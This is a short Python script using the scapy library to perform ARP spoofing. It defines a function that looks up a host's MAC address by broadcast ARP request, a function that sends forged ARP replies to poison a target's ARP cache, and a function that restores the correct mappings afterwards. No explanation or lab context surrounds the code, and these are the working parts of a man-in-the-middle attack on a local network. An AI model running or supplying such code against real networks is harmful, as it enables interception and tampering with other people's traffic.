from scapy.all  import *
from scapy.layers.l2 import Ether
from time import sleep
def get_mac(ip:str):
    arp_req=ARP(pdst=ip)
    broad_cast=Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast=broad_cast/arp_req
    answer=srp(arp_req_broadcast,timeout=5,verbose=False)[0]#[ip] [mac [ip]]
    return answer[0][1].hwsrc
    
def spoofing(target_ip,spoof_ip):
    pkt=ARP(op=2,pdst=target_ip,psrc=spoof_ip,hwdst=get_mac(target_ip))
    send(pkt,verbose=False)
def restore(dest_ip,src_ip):
    dst_mac=get_mac(dest_ip)
    src_mac=get_mac(src_ip)
    pkt=ARP(op=2,pdst=dest_ip,psrc=src_ip,hwdst=dst_mac,hwsrc=src_mac)
    send(pkt,verbose=False)